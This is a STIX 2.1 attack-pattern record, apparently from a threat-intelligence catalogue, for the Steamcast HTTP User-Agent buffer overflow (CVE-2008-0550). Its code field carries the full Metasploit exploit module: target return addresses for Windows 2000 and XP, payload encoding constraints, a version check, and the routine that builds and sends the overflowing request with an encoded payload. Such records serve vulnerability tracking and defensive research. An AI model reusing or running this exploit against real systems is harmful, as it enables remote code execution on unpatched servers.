{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--cae34996-8ad1-4e46-87eb-3a548d15b84e",
    "created": "2024-08-14T16:51:55.017235Z",
    "modified": "2024-08-14T16:51:55.017239Z",
    "name": "Streamcast HTTP User-Agent Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in Streamcast <= 0.9.75. By sending an overly long User-Agent in an HTTP GET request, an attacker may be able to execute arbitrary code. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/steamcast_useragent.rb",
            "external_id": "steamcast_useragent.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-0550"
        },
        {
            "source_name": "reference",
            "url": "http://aluigi.altervista.org/adv/steamcazz-adv.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = AverageRanking\n\n  include Msf::Exploit::Remote::Tcp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Streamcast HTTP User-Agent Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in Streamcast <= 0.9.75. By sending\n          an overly long User-Agent in an HTTP GET request, an attacker may be able to\n          execute arbitrary code.\n      },\n      'Author'         => \t[\n              'LSO <lso[at]hushmail.com>', # Original exploit module\n              'aushack' # Added references and check code. Default target to XP.\n            ],\n      'License'        => BSD_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2008-0550' ],\n          [ 'OSVDB', '42670' ],\n          [ 'URL', 'http://aluigi.altervista.org/adv/steamcazz-adv.txt'],\n          [ 'BID', '33898' ],\n        ],\n      'Privileged'     => false,\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'thread',\n          'AllowWin32SEH' => true\n        },\n      'Payload'        =>\n        {\n          'Space'    => 750,\n          'BadChars' => \"\\x00\\x3a\\x26\\x3f\\x25\\x23\\x20\\x0a\\x0d\\x2f\\x2b\\x0b\\x5c\",\n          'StackAdjustment' => -3500,\n          'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,\n          'DisableNops'  =>  'True',\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          # Tested OK by patrick 20090225\n          [ 'Windows 2000 Pro English All', { 'Ret' => 0x75022ac4 } ],\n          [ 'Windows XP Pro SP0/SP1 English', { 'Ret' => 0x71aa32ad } ],\n        ],\n      'DisclosureDate' => '2008-01-24',\n      'DefaultTarget' => 1))\n\n      register_options([ Opt::RPORT(8000) ], self)\n  end\n\n  def check\n    connect\n    sock.put(\"GET / HTTP/1.0\\r\\n\\r\\n\")\n    res = sock.get_once\n    disconnect\n\n    if (res.to_s =~ /Steamcast\\/0\\.9\\.75/)\n      return Exploit::CheckCode::Appears\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    connect\n\n    juju =  \"GET / HTTP/1.0\\r\\n\"\n    juju << \"User-Agent: \" + make_nops(1008 - payload.encoded.length)\n    juju << payload.encoded + Rex::Arch::X86.jmp_short(6) + make_nops(2)\n    juju << [ target.ret ].pack('V') + [0xe8, -850].pack('CV')\n    juju <<  rand_text_alpha_upper(275)\n\n    print_status(\"Trying target #{target.name}...\")\n    sock.put(juju + \"\\r\\n\\r\\n\")\n\n    handler\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2008-01-24",
    "x_mitre_platforms": [
        "win'"
    ]
}